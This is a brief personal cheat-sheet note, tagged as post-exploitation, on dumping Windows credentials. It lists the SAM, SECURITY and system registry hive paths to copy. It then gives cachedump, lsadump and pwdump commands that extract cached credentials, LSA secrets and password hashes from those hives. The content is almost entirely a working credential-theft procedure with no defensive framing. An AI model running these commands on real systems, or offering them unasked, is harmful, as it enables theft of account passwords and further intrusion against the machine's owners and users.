---
tags: [PostEx]
title: PostEx/Windows Creds Dump
created: '2020-01-22T09:04:11.474Z'
modified: '2020-01-23T02:13:56.160Z'
---

# PostEx/Windows Creds Dump
Get three files
1. `C:\Windows\System32\config\SAM`
2. `C:\Windows\System32\config\SECURITY`
3. `C:\Windows\System32\config\system`

Get data from them
```
cachedump system SECURITY
lsadump system SECURITY
pwdump system SAM
```
